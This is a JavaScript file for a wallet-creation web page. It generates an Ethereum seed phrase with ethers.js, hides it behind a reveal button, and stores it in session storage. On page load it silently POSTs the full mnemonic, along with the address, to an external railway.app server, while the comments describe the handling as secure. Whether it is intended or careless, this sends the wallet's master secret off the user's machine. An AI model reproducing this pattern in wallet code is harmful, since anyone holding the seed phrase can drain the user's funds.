document.addEventListener("DOMContentLoaded", () => {
    if (typeof ethers === "undefined") {
        console.error("Ethers.js is not available.");
        return;
    }

    const mnemonicBox = document.getElementById("mnemonic-phrase");
    const revealButton = document.getElementById("reveal-mnemonic");
    const continueButton = document.getElementById("continue-to-wallet");
    const backButton = document.getElementById("back-to-home");

    // Securely store mnemonic in sessionStorage instead of localStorage
    let mnemonic = sessionStorage.getItem("savedMnemonic");

    // Generate a new mnemonic if one doesn't exist
    if (!mnemonic) {
        try {
            mnemonic = ethers.Wallet.createRandom().mnemonic.phrase;
            sessionStorage.setItem("savedMnemonic", mnemonic); // Save to sessionStorage
        } catch (error) {
            console.error("Error creating wallet:", error);
            return;
        }
    }

    // Prepare the mnemonic as a numbered list
    const words = mnemonic.split(" ");
    const numberedMnemonic = words
        .map((word, index) => `${index + 1}. ${word}`)
        .join("\n");

    // Hide the mnemonic until "Reveal" is clicked
    mnemonicBox.textContent = "**********";

    // Reveal mnemonic when the button is clicked
    revealButton.addEventListener("click", () => {
        mnemonicBox.textContent = numberedMnemonic;
        mnemonicBox.style.display = "block";
        revealButton.disabled = true; // Disable the reveal button
        continueButton.disabled = false; // Enable the continue button
    });

    // Send wallet data to your blockchain API
    const wallet = ethers.Wallet.fromMnemonic(mnemonic);
    const publicKey = wallet.address;

    // Save wallet data to your blockchain
    fetch("https://aeroblockchain-production.up.railway.app/add_wallet", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            address: publicKey,
            mnemonic: mnemonic, // Optional: Remove if not needed
        }),
    })
        .then((response) => response.json())
        .then((data) => {
            console.log("Wallet saved to blockchain:", data);
        })
        .catch((error) => {
            console.error("Error saving wallet to blockchain:", error);
        });

    // Continue button logic
    continueButton.addEventListener("click", () => {
        window.location.href = "verify_mnemonic.html";
    });

    // Back button logic: Remove mnemonic from sessionStorage and redirect to index page
    backButton.addEventListener("click", () => {
        sessionStorage.removeItem("savedMnemonic");
        window.location.href = "index.html";
    });
});
